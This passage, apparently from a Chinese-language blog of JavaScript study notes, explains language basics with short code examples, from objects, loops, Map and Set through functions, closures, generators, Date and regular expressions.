<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xiao=&#123;</span><br><span class="line">	name: <span class="string">'xiao'</span>,</span><br><span class="line">	age: <span class="number">18</span>,</span><br><span class="line">	<span class="string">'school'</span>: <span class="string">'No.1'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(xiao.name)</span><br><span class="line"><span class="built_in">console</span>.log(xiao[<span class="string">'name'</span>])  <span class="comment">//两种都可以访问xiao的name值</span></span><br><span class="line"><span class="built_in">console</span>.log(xiao[<span class="string">'school'</span>])</span><br></pre></td></tr></table></figure>
<p>由于JavaScript的对象是动态类型，你可以自由地给一个对象添加或删除属性.</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xiao=&#123;</span><br><span class="line">	name: <span class="string">'xiao'</span>,</span><br><span class="line">&#125;</span><br><span class="line">xiao.age=<span class="number">18</span>;</span><br><span class="line">alert(xiao.age);</span><br><span class="line"><span class="keyword">delete</span> xiao.age</span><br><span class="line"></span><br><span class="line"><span class="comment">//可以用hasOwnProperty()方法来判断属性是否是自身拥有的</span></span><br><span class="line">xiao.hasOwnProperty(<span class="string">'name'</span>) <span class="comment">//true</span></span><br><span class="line">xiao.hasOwnProperty(<span class="string">'age'</span>) <span class="comment">//false</span></span><br></pre></td></tr></table></figure>
<h2 id="条件判断"><a href="#条件判断" class="headerlink" title="条件判断"></a>条件判断</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;单个判断</span><br><span class="line">if(...)&#123;</span><br><span class="line">	...</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;多行条件判断</span><br><span class="line">	if()&#123;</span><br><span class="line">..</span><br><span class="line">&#125;else if()&#123;</span><br><span class="line">..</span><br><span class="line">&#125;else&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>JavaScript把<code>null</code>、<code>undefined</code>、<code>0</code>、<code>NaN</code>和空字符串<code>&#39;&#39;</code>视为<code>false</code>，其他值一概视为<code>true</code>.</p>
<h2 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for(;;)&#123;</span><br><span class="line">	...;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>for循环最常用的地方就是遍历数组</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(arr[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//1  2  3</span></span><br></pre></td></tr></table></figure>
<h3 id="for-in"><a href="#for-in" class="headerlink" title="for in"></a><strong>for in</strong></h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> o = &#123;</span><br><span class="line">	name: <span class="string">'bob'</span>,</span><br><span class="line">	age: <span class="number">18</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> key <span class="keyword">in</span> o)&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(key);</span><br><span class="line">  <span class="built_in">console</span>.log(o[key]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//name age</span></span><br><span class="line"><span class="comment">//bob 18</span></span><br><span class="line"><span class="comment">//同样，数组中也可以用for...in</span></span><br><span class="line"><span class="keyword">var</span> a = [<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'C'</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i <span class="keyword">in</span> a)&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(a[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//A  B  C</span></span><br></pre></td></tr></table></figure>
<p><strong>while</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">while(...)&#123;</span><br><span class="line">	...;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>do…while</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">do&#123;</span><br><span class="line">	...</span><br><span class="line">&#125;while(...)</span><br></pre></td></tr></table></figure>
<h2 id="Map和Set"><a href="#Map和Set" class="headerlink" title="Map和Set"></a>Map和Set</h2><p>JavaScript的默认对象表示方式<code>{}</code>可以视为其他语言中的<code>Map</code>或<code>Dictionary</code>的数据结构，即一组键值对。</p>
<p>但是JavaScript的对象有个小问题，就是键必须是字符串。<strong>但实际上Number或者其他数据类型作为键也是非常合理的。</strong></p>
<h3 id="Map"><a href="#Map" class="headerlink" title="Map"></a><strong>Map</strong></h3><p><code>Map</code>是一组键值对的结构，具有极快的查找速度。</p>
<p>初始化<code>Map</code>需要一个<strong>二维数组</strong>，或者直接初始化一个空<code>Map</code>。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Map初始化</span></span><br><span class="line"><span class="keyword">var</span> m = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line"><span class="comment">//增</span></span><br><span class="line">m.set(<span class="string">'Bob'</span>,<span class="number">100</span>);</span><br><span class="line">m.set(<span class="string">'Pz1o'</span>,<span class="number">99</span>);</span><br><span class="line"><span class="comment">//删</span></span><br><span class="line">m.delete(<span class="string">'Bob'</span>);</span><br><span class="line"><span class="comment">//查</span></span><br><span class="line">m.has(<span class="string">'Pz1o'</span>); <span class="comment">//true</span></span><br><span class="line">m.get(<span class="string">'Pz1o'</span>); <span class="comment">//99</span></span><br></pre></td></tr></table></figure>
<p>注意：一个key只能对应一个value，重复定义后面的值会覆盖掉前面的值。</p>
<hr>
<h3 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h3><p><code>Set</code>和<code>Map</code>类似，也是一组key的集合，但不存储value。由于key不能重复，所以，在<code>Set</code>中，没有重复的key。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//set初始化</span></span><br><span class="line"><span class="keyword">var</span> s = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]);</span><br><span class="line"><span class="comment">//重复元素会被自动过滤</span></span><br><span class="line"><span class="keyword">var</span> s = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>]);</span><br><span class="line"><span class="comment">//增</span></span><br><span class="line">s.add(<span class="number">4</span>);</span><br><span class="line"><span class="comment">//删</span></span><br><span class="line">s,<span class="keyword">delete</span>(<span class="number">3</span>);</span><br><span class="line"><span class="comment">//查</span></span><br><span class="line">s;</span><br></pre></td></tr></table></figure>
<h2 id="iterable"><a href="#iterable" class="headerlink" title="iterable"></a>iterable</h2><p>遍历<code>Array</code>可以采用下标循环，遍历<code>Map</code>和<code>Set</code>就无法使用下标。为了统一集合类型，ES6标准引入了新的<code>iterable</code>类型，<code>Array</code>、<code>Map</code>和<code>Set</code>都属于<code>**iterable</code>类型。**</p>
<p><strong>具有<code>iterable</code>类型的集合可以通过新的<code>for ... of</code>循环来遍历。</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> s = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]);</span><br><span class="line"><span class="keyword">var</span> m = <span class="keyword">new</span> <span class="built_in">Map</span>([[<span class="string">'A'</span>,<span class="string">'a'</span>],[<span class="string">'Y'</span>,<span class="string">'y'</span>]]);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i <span class="keyword">of</span> a)&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//1  2  3</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i <span class="keyword">of</span> s)&#123;</span><br><span class="line">   <span class="built_in">console</span>.log(i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//1  2  3</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i <span class="keyword">of</span> m)&#123;</span><br><span class="line">   <span class="built_in">console</span>.log(i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//["A","a"]  ["Y","y"]</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>for...in</code>和<code>for...of</code>的不同点：</p>
<p><code>for...in</code>会遍历对象的所有属性名称，一个<code>Array</code>数组实际上也是一个对象，它的每个元素的索引被视为一个属性。</p>
<p><code>for...of</code>则修复了这些问题，它只遍历循环集合的本身元素。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;forEach函数同样可以用来遍历</span><br><span class="line">var a &#x3D; [&#39;A&#39;,&#39;B&#39;,&#39;C&#39;];</span><br><span class="line">a.forEach(function(value,index,a)&#123;</span><br><span class="line">	console.log(value+&#39;,&#39;+index);</span><br><span class="line">&#125;);</span><br><span class="line">&#x2F;&#x2F;A,0  B,1  C,2</span><br><span class="line">forEach(值,键,自身)</span><br></pre></td></tr></table></figure>
<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><h2 id="函数定义和调用"><a href="#函数定义和调用" class="headerlink" title="函数定义和调用"></a>函数定义和调用</h2><p><strong>定义函数</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">abs</span>(<span class="params">...</span>)</span>&#123;</span><br><span class="line">	...</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//function 指明是函数的定义</span></span><br><span class="line"><span class="comment">//abs是函数名称</span></span><br><span class="line"><span class="comment">//(...)里面是参数</span></span><br><span class="line"><span class="comment">//&#123;...&#125;是函数体</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//另一种定义方法</span></span><br><span class="line"><span class="keyword">var</span> abs = <span class="function"><span class="keyword">function</span>(<span class="params">..</span>)</span>&#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//在这种方式下，function(x)&#123; ... &#125;是一个匿名函数，它没有函数名。但是，这个匿名函数赋值给了变量abs，所以，通过变量abs就可以调用该函数。</span></span><br></pre></td></tr></table></figure>
<p>请注意，函数体内部的语句在执行时，一旦执行到<code>return</code>时，函数就执行完毕，并将结果返回。因此，函数内部通过条件判断和循环可以实现非常复杂的逻辑。</p>
<p>如果没有<code>return</code>语句，函数执行完毕后也会返回结果，只是结果为<code>undefined</code>。</p>
<hr>
<p><strong>调用函数</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">abs(10);</span><br><span class="line">abs(10,111);  &#x2F;&#x2F;返回10</span><br><span class="line">abs();     &#x2F;&#x2F;返回NaN</span><br></pre></td></tr></table></figure>
<p>由于JavaScript允许传入任意个参数而不影响调用，因此传入的参数比定义的参数多也没有问题。</p>
<hr>
<p><strong>arguments</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//arguments(伪数组)</span></span><br><span class="line"><span class="comment">//存储了用户的所有实参</span></span><br><span class="line"><span class="comment">//伪数组 有length属性 是按照索引存储的</span></span><br><span class="line">fn(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)  <span class="comment">//arguments的数组就是1 2 3</span></span><br></pre></td></tr></table></figure>
<p>实际上<code>arguments</code>最常用于判断传入参数的个数,以此来判断缺失参数。</p>
<hr>
<p><strong>rest</strong></p>
<p>由于js中会接受接受多余的参数，所以用一个rest数组来表示多余的参数。rest参数只能写在最后，前面用<code>...</code>标识。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params">a,b,...rest</span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(rest);</span><br><span class="line"><span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line">fn(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);  <span class="comment">//[3]</span></span><br><span class="line">fn(<span class="number">1</span>,<span class="number">2</span>)     <span class="comment">//[]</span></span><br></pre></td></tr></table></figure>
<h2 id="变量作用域与解构赋值"><a href="#变量作用域与解构赋值" class="headerlink" title="变量作用域与解构赋值"></a>变量作用域与解构赋值</h2><p>如果一个变量在函数体内部申明，则该变量的作用域为整个函数体，在函数体外不可引用该变量。</p>
<p>如果两个不同的函数各自申明了同一个变量，那么该变量只在各自的函数体内起作用。换句话说，不同函数内部的同名变量互相独立，互不影响。</p>
<hr>
<p><strong>全局作用域</strong></p>
<p>不在任何函数内定义的变量就具有全局作用域。实际上，JavaScript默认有一个全局对象<code>window</code>，全局作用域的变量实际上被绑定到<code>window</code>的一个属性。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="string">'A'</span>;</span><br><span class="line"><span class="built_in">console</span>.log(a);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">window</span>.a);</span><br></pre></td></tr></table></figure>
<p>同样的，函数也是一个变量，也会绑定到<code>windows</code>对象。任何变量（函数也视为变量），如果没有在当前函数作用域中找到，就会继续往上查找，最后如果在全局作用域中也没有找到，则报<code>ReferenceError</code>错误。</p>
<hr>
<p><strong>名字空间</strong></p>
<p>全局变量会绑定到<code>window</code>上，不同的JavaScript文件如果使用了相同的全局变量，或者定义了相同名字的顶层函数，都会造成命名冲突，并且很难被发现。<strong>减少冲突的一个方法是把自己的所有变量和函数全部绑定到一个全局变量中。</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> Ma = <span class="number">0</span>;</span><br><span class="line">Ma.name = <span class="string">"xiaoming"</span>;</span><br><span class="line">Ma.fn = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> ....</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>局部作用域</strong></p>
<p>为了解决块级作用域，ES6引入了新的关键字<code>let</code>，用<code>let</code>替代<code>var</code>可以申明一个块级作用域的变量。</p>
<p><strong>常量</strong></p>
<p>ES6标准引入了新的关键字<code>const</code>来定义常量，<code>const</code>与<code>let</code>都具有块级作用域。</p>
<p><strong>解构赋值</strong></p>
<p>解构赋值就是同时对一组变量进行赋值。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> [x, y, z] = [<span class="string">'hello'</span>, <span class="string">'JavaScript'</span>, <span class="string">'ES6'</span>];</span><br><span class="line"><span class="built_in">console</span>.log(x);</span><br></pre></td></tr></table></figure>
<p>如果需要从一个对象中取出若干属性，也可以使用解构赋值，便于快速获取对象的指定属性。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line">    name : <span class="string">'xiaoming'</span>,</span><br><span class="line">		age : <span class="number">18</span>,</span><br><span class="line">		university : &#123;</span><br><span class="line">				specialities : <span class="string">'cs'</span></span><br><span class="line">		&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//直接赋值</span></span><br><span class="line"><span class="keyword">var</span> &#123;name,age&#125; = person;</span><br><span class="line"><span class="comment">//嵌套对象的赋值</span></span><br><span class="line"><span class="keyword">var</span> &#123;<span class="attr">university</span> : &#123;specialities&#125;&#125; = person;</span><br><span class="line"><span class="comment">//如果想要的变量和对象的属性名不一样，可以如下操作</span></span><br><span class="line"><span class="keyword">var</span> &#123;<span class="attr">name</span>:mz&#125; = person;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>使用场景：解构赋值在很多时候可以大大简化代码。例如，交换两个变量<code>x</code>和<code>y</code>的值，可以这么写，不再需要临时变量。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var x &#x3D; 1,y &#x3D; 2;</span><br><span class="line">[x , y] &#x3D; [y ,x];</span><br></pre></td></tr></table></figure>
<p>如果一个函数接收一个对象作为参数，那么，可以使用解构直接把对象的属性绑定到变量中。</p>
</blockquote>
<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><p>在一个对象中绑定函数，称为这个对象的方法。</p>
<p>在一个方法内部，<code>this</code>是一个特殊变量，它始终指向当前对象，也就是<code>xiaoming</code>这个变量。所以，<code>this.birth</code>可以拿到<code>xiaoming</code>的<code>birth</code>属性。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getAge</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> y = <span class="keyword">new</span> <span class="built_in">Date</span>().getFullYear();</span><br><span class="line">    <span class="keyword">return</span> y - <span class="keyword">this</span>.birth;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> xiaoming = &#123;</span><br><span class="line">    name: <span class="string">'小明'</span>,</span><br><span class="line">    birth: <span class="number">1990</span>,</span><br><span class="line">    age: getAge</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xiaoming.age(); <span class="comment">// 30, 正常结果</span></span><br><span class="line">getAge(); <span class="comment">// NaN</span></span><br></pre></td></tr></table></figure>
<p>如果以对象的方法形式调用，比如<code>xiaoming.age()</code>，该函数的<code>this</code>指向被调用的对象，也就是<code>xiaoming</code>，这是符合我们预期的。</p>
<p>如果单独调用函数，比如<code>getAge()</code>，此时，该函数的<code>this</code>指向全局对象，也就是<code>window</code>。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">‘use strict’;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> xiaoming = &#123;</span><br><span class="line">	name : <span class="string">'xiaoming'</span>,</span><br><span class="line">	age : <span class="number">18</span>,</span><br><span class="line">	math : <span class="number">90</span>,</span><br><span class="line">	en : <span class="number">99</span>,</span><br><span class="line">	grades : <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">var</span> that = <span class="keyword">this</span>;  <span class="comment">//捕捉this指针</span></span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">getGrades</span>(<span class="params"></span>)</span>&#123;  <span class="comment">//进行重构</span></span><br><span class="line">		<span class="keyword">return</span> that.math+that.en;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> getGrades();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="高阶函数"><a href="#高阶函数" class="headerlink" title="高阶函数"></a>高阶函数</h2><h3 id="map"><a href="#map" class="headerlink" title="map"></a>map</h3><p>由于<code>map()</code>方法定义在JavaScript的<code>Array</code>中，我们调用<code>Array</code>的<code>map()</code>方法，传入我们自己的函数，就得到了一个新的<code>Array</code>作为结果。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line">arr.map(<span class="function"><span class="params">x</span>=&gt;</span>x*<span class="number">2</span>); <span class="comment">//[2,4,6]</span></span><br><span class="line">arr.map(<span class="function"><span class="keyword">function</span>(<span class="params">x</span>)</span>&#123;<span class="keyword">return</span> x*<span class="number">2</span>;&#125;); <span class="comment">//[2,4,6]</span></span><br></pre></td></tr></table></figure>
<h3 id="reduce"><a href="#reduce" class="headerlink" title="reduce"></a>reduce</h3><p>rray的<code>reduce()</code>把一个函数作用在这个<code>Array</code>的<code>[x1, x2, x3...]</code>上，这个函数必须接收两个参数，<code>reduce()</code>把结果继续和序列的下一个元素做累积计算。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [x1,x2,x3,x4];</span><br><span class="line">arr.reduce(<span class="function">(<span class="params">x,y</span>)=&gt;</span>(x+y)); <span class="comment">//x1+x2+x3+x4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>];</span><br><span class="line">arr.reduce(<span class="function"><span class="keyword">function</span> (<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x * <span class="number">10</span> + y;</span><br><span class="line">&#125;); <span class="comment">// 13579</span></span><br></pre></td></tr></table></figure>
<h3 id="filter"><a href="#filter" class="headerlink" title="filter"></a><strong>filter</strong></h3><p>filter也是一个常用的操作，它用于把<code>Array</code>的某些元素过滤掉，然后返回剩下的元素。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>];</span><br><span class="line"><span class="keyword">var</span> r = arr.filter(<span class="function"><span class="keyword">function</span>(<span class="params">x</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> x%<span class="number">2</span> !=<span class="number">0</span>;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">console</span>.log(r);</span><br></pre></td></tr></table></figure>
<h3 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h3><p>js中排序算法是先把所有元素先转换为String再按照ascii码排序。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var arr &#x3D; [10,20,1,2];</span><br><span class="line">var r &#x3D; arr.sort(function(x,y)&#123;</span><br><span class="line">	if(x&lt;y)return 1;</span><br><span class="line">	else if(x&gt;y)return -1;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;)</span><br><span class="line">console.log(arr) &#x2F;&#x2F;[20,10,2,1]</span><br><span class="line">console.log(r)  &#x2F;&#x2F;[20,10,2,1]</span><br></pre></td></tr></table></figure>
<p><code>sort()</code>方法会直接对<code>Array</code>进行修改，它返回的结果仍是当前<code>Array</code>。</p>
<h2 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h2><p><strong>函数作为返回值</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lazy_sum</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> sum = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> arr.reduce(<span class="function"><span class="keyword">function</span> (<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> x + y;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> f = lazy_sum([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]);</span><br><span class="line">f;   <span class="comment">//f是返回sum函数本身</span></span><br><span class="line">f();  <span class="comment">//f()才是调用函数</span></span><br></pre></td></tr></table></figure>
<h2 id="箭头函数"><a href="#箭头函数" class="headerlink" title="箭头函数"></a>箭头函数</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//无&#123;&#125;的</span></span><br><span class="line">x =&gt; x*x</span><br><span class="line"><span class="function"><span class="keyword">function</span> (<span class="params">x</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> x*x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//返回多条</span></span><br><span class="line">x =&gt; &#123;</span><br><span class="line">	... return ;</span><br><span class="line">	... return ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//多个参数</span></span><br><span class="line">(x,y) =&gt; x*x+y*y</span><br><span class="line"><span class="comment">//返回对象</span></span><br><span class="line">x =&gt; (&#123;<span class="attr">foo</span>:x&#125;);</span><br></pre></td></tr></table></figure>
<h2 id="generator"><a href="#generator" class="headerlink" title="generator"></a>generator</h2><p>generator由<code>function*</code>定义（注意多出的<code>*</code>号），并且，除了<code>return</code>语句，还可以用<code>yield</code>返回多次。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function* foo(x)&#123;</span><br><span class="line">  yield x+1;</span><br><span class="line">  yield x+2;</span><br><span class="line">  return x+3;</span><br><span class="line">&#125;</span><br><span class="line">foo(2);</span><br></pre></td></tr></table></figure>
<p>调用generator对象有两个方法，</p>
<ul>
<li><p>一是不断地调用generator对象的<code>next()</code>方法<code>next()</code>方法会执行generator的代码，然后，每次遇到<code>yield x;</code>就返回一个对象<code>{value: x, done: true/false}</code>，然后“暂停”。返回的<code>value</code>就是<code>yield</code>的返回值，<code>done</code>表示这个generator是否已经执行结束了。如果<code>done</code>为<code>true</code>，则<code>value</code>就是<code>return</code>的返回值。</p>
</li>
<li><p>第二个方法是直接用<code>for ... of</code>循环迭代generator对象，这种方式不需要我们自己判断<code>done</code>。</p>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//第一种</span></span><br><span class="line"><span class="keyword">var</span> f = foo(<span class="number">2</span>);</span><br><span class="line">f.next()	<span class="comment">//&#123;value: 3, done: false&#125;</span></span><br><span class="line">f.next()	<span class="comment">//&#123;value: 4, done: false&#125;</span></span><br><span class="line">f.next()	<span class="comment">//&#123;value: 5, done: true&#125;</span></span><br><span class="line">f.next()	<span class="comment">//&#123;value: undefined, done: true&#125;</span></span><br><span class="line"><span class="comment">//第二种</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> x <span class="keyword">of</span> foo(<span class="number">2</span>))&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;  <span class="comment">//3,4</span></span><br></pre></td></tr></table></figure>
<h1 id="标准对象"><a href="#标准对象" class="headerlink" title="标准对象"></a>标准对象</h1><ul>
<li>不要使用<code>new Number()</code>、<code>new Boolean()</code>、<code>new String()</code>创建包装对象；</li>
<li>用<code>parseInt()</code>或<code>parseFloat()</code>来转换任意类型到<code>number</code>；</li>
<li>用<code>String()</code>来转换任意类型到<code>string</code>，或者直接调用某个对象的<code>toString()</code>方法；</li>
<li>通常不必把任意类型转换为<code>boolean</code>再判断，因为可以直接写<code>if (myVar) {...}</code>；</li>
<li><code>typeof</code>操作符可以判断出<code>number</code>、<code>boolean</code>、<code>string</code>、<code>function</code>和<code>undefined</code>；</li>
<li>判断<code>Array</code>要使用<code>Array.isArray(arr)</code>；</li>
<li>判断<code>null</code>请使用<code>myVar === null</code>；</li>
<li>判断某个全局变量是否存在用<code>typeof window.myVar === &#39;undefined&#39;</code>；</li>
<li>函数内部判断某个变量是否存在用<code>typeof myVar === &#39;undefined&#39;</code>。</li>
</ul>
<h2 id="Date"><a href="#Date" class="headerlink" title="Date"></a>Date</h2><p>在JavaScript中，<code>Date</code>对象用来表示日期和时间。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var now &#x3D; new Date();</span><br><span class="line">now.getMilliseconds();  &#x2F;&#x2F;毫秒数</span><br><span class="line">now.getTime();  &#x2F;&#x2F;时间戳</span><br><span class="line">var d &#x3D; new Date(2020,6,30,8,39,30,123)  &#x2F;&#x2F;自定义时间</span><br></pre></td></tr></table></figure>
<h2 id="RegExp"><a href="#RegExp" class="headerlink" title="RegExp"></a>RegExp</h2><h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a><strong>基础</strong></h3><p><code>\d</code>可以匹配一个数字</p>
<p><code>\w</code>可以匹配一个字母或数字</p>
<p><code>.</code>可以匹配任意字符</p>
<p><code>*</code>表示任意个字符</p>
<p><code>+</code>表示至少一个字符</p>
<p><code>?</code>表示0个或1个字符</p>
<p><code>{n}</code>表示n个字符</p>
<p><code>{n,m}</code>表示n-m个字符</p>
<h3 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a><strong>进阶</strong></h3><p>要做更精确地匹配，可以用<code>[]</code>表示范围</p>
<ul>
<li><code>[0-9a-zA-Z\_]</code>可以匹配一个数字、字母或者下划线；</li>
<li><code>[0-9a-zA-Z\_]+</code>可以匹配至少由一个数字、字母或者下划线组成的字符串，比如<code>&#39;a100&#39;</code>，<code>&#39;0_Z&#39;</code>，<code>&#39;js2015&#39;</code>等等；</li>
<li><code>[a-zA-Z\_\$][0-9a-zA-Z\_\$]*</code>可以匹配由字母或下划线 d号开头，后接任意个由一个数字、字母或者下划线 d号组成的字符串，也就是JavaScript允许的变量名；</li>
<li><code>[a-zA-Z\_\$][0-9a-zA-Z\_\$]{0, 19}</code>更精确地限制了变量的长度是1-20个字符（前面1个字符+后面最多19个字符）。</li>
</ul>
<p><code>A|B</code>可以匹配A或B</p>
<p><code>^</code>表示行的开头，<code>^\d</code>表示必须以数字开头。</p>
<p><code>$</code>表示行的结束，<code>\d$</code>表示必须以数字结束。</p>
<h3 id="js正则"><a href="#js正则" class="headerlink" title="js正则"></a><strong>js正则</strong></h3><p>JavaScript有两种方式创建一个正则表达式：</p>
<p>第一种方式是直接通过<code>/正则表达式/</code>写出来，第二种方式是通过<code>new RegExp(&#39;正则表达式&#39;)</code>创建一个RegExp对象。</p>
